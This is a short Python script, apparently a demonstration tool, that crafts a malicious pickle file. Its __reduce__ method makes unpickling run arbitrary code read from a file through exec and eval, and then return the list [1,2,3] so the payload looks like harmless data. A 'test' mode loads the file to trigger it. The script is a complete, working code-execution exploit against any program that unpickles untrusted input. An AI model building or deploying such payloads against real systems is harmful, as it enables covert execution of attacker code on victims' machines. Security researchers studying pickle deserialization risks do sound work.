import pickle

class BadPickleMaker:
    def __init__(self, pickle_result, arbitrary_code):
        pickle_result_pickled = pickle.dumps(pickle_result)
        arbitrary_code = arbitrary_code
        self._code = "exec('''{}''') or ".format(arbitrary_code)
        self._code += "__import__('pickle').loads({})".format(pickle_result_pickled)
        self._code = self._code.encode()
        
    def __reduce__(self):
        return (eval, (self._code,))
        
if __name__=="__main__":
    import sys
    cmd = sys.argv[1]
    if cmd == "create":
        code_file = sys.argv[2]
        output_file = sys.argv[3]
        print("Creating evil pickle from code file {}. Will appear to be the list [1,2,3]".format(code_file))
        with open(code_file) as code_reader:
            with open(output_file, "wb+") as f:
                f.write(pickle.dumps(BadPickleMaker([1,2,3], code_reader.read())))
    elif cmd == "test":
        pickle_file = sys.argv[2]
        print("Loading pickle from {}".format(pickle_file))
        with open(pickle_file, "rb") as f:
            data = f.read()
        result = pickle.loads(data)
        print("Got result {}".format(result))